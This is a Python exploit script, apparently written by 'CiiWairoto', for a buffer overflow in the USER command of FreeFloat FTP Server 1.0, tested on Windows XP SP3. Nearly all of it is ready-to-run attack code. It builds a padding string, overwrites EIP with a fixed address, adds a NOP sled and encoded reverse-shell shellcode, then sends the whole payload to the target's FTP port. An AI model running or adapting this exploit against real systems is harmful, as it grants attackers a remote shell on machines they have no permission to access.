## This is a reverse shell TCP python code for exploiting FreeFloat FTP Server Version 1.
## Using this code, you will be able to exploit Free Float's 'USER' argument vulnerability.
## This code has been tested on a Windows XP Service Pack 3 machine.
## Written by CiiWairoto.




#!/usr/bin/python

import socket
import sys

## Specifying IP address & port
if len(sys.argv)<3 :
        print '[!] You need to provide the IP & Port'
        print '\t[-] E.g. %s 192.168.56.101 21' % sys.argv[0]
        sys.exit
else:
        target=sys.argv[1]
        port=int(sys.argv[2])



##Connecting  to the target
try:
	print("[+] Connecting to target.")
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.setdefaulttimeout(10)
	soc.connect((target, port))

	print("[+] Reviewed a banner.")
	print(soc.recv(1024))
except Exception as err:
	print "[!] Connection failed"
	print err


junk1= "\x41"*230
eip= "\x77\x9c\x55\x77"
nops= "\x90" *16
buf =  ""
buf += "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\xa5\x49\x18\xd0\x83\xee\xfc\xe2\xf4\x59\xa1"
buf += "\x9a\xd0\xa5\x49\x78\x59\x40\x78\xd8\xb4\x2e\x19\x28"
buf += "\x5b\xf7\x45\x93\x82\xb1\xc2\x6a\xf8\xaa\xfe\x52\xf6"
buf += "\x94\xb6\xb4\xec\xc4\x35\x1a\xfc\x85\x88\xd7\xdd\xa4"
buf += "\x8e\xfa\x22\xf7\x1e\x93\x82\xb5\xc2\x52\xec\x2e\x05"
buf += "\x09\xa8\x46\x01\x19\x01\xf4\xc2\x41\xf0\xa4\x9a\x93"
buf += "\x99\xbd\xaa\x22\x99\x2e\x7d\x93\xd1\x73\x78\xe7\x7c"
buf += "\x64\x86\x15\xd1\x62\x71\xf8\xa5\x53\x4a\x65\x28\x9e"
buf += "\x34\x3c\xa5\x41\x11\x93\x88\x81\x48\xcb\xb6\x2e\x45"
buf += "\x53\x5b\xfd\x55\x19\x03\x2e\x4d\x93\xd1\x75\xc0\x5c"
buf += "\xf4\x81\x12\x43\xb1\xfc\x13\x49\x2f\x45\x16\x47\x8a"
buf += "\x2e\x5b\xf3\x5d\xf8\x21\x2b\xe2\xa5\x49\x70\xa7\xd6"
buf += "\x7b\x47\x84\xcd\x05\x6f\xf6\xa2\xb6\xcd\x68\x35\x48"
buf += "\x18\xd0\x8c\x8d\x4c\x80\xcd\x60\x98\xbb\xa5\xb6\xcd"
buf += "\x80\xf5\x19\x48\x90\xf5\x09\x48\xb8\x4f\x46\xc7\x30"
buf += "\x5a\x9c\x8f\xba\xa0\x21\xd8\x78\x9d\x81\x70\xd2\xa5"
buf += "\x4e\xfc\x59\x43\x23\x08\x86\xf2\x21\x81\x75\xd1\x28"
buf += "\xe7\x05\x20\x89\x6c\xdc\x5a\x07\x10\xa5\x49\x21\xe8"
buf += "\x65\x07\x1f\xe7\x05\xcd\x2a\x75\xb4\xa5\xc0\xfb\x87"
buf += "\xf2\x1e\x29\x26\xcf\x5b\x41\x86\x47\xb4\x7e\x17\xe1"
buf += "\x6d\x24\xd1\xa4\xc4\x5c\xf4\xb5\x8f\x18\x94\xf1\x19"
buf += "\x4e\x86\xf3\x0f\x4e\x9e\xf3\x1f\x4b\x86\xcd\x30\xd4"
buf += "\xef\x23\xb6\xcd\x59\x45\x07\x4e\x96\x5a\x79\x70\xd8"
buf += "\x22\x54\x78\x2f\x70\xf2\xe8\x65\x07\x1f\x70\x76\x30"
buf += "\xf4\x85\x2f\x70\x75\x1e\xac\xaf\xc9\xe3\x30\xd0\x4c"
buf += "\xa3\x97\xb6\x3b\x77\xba\xa5\x1a\xe7\x05"

junk2 = "\x43" *16

username= junk1 + eip + nops + buf + junk2
password = "hacker"

try:
	print("[+] Sending credentials.")
	soc.send("USER " + username + "\r\n")
	print(soc.recv(1024))
	soc.close()

except Exception as err:
	print("Exploit Failed")
	sys.exit()


print("[+] Done! Closing Connection.")
soc.close()
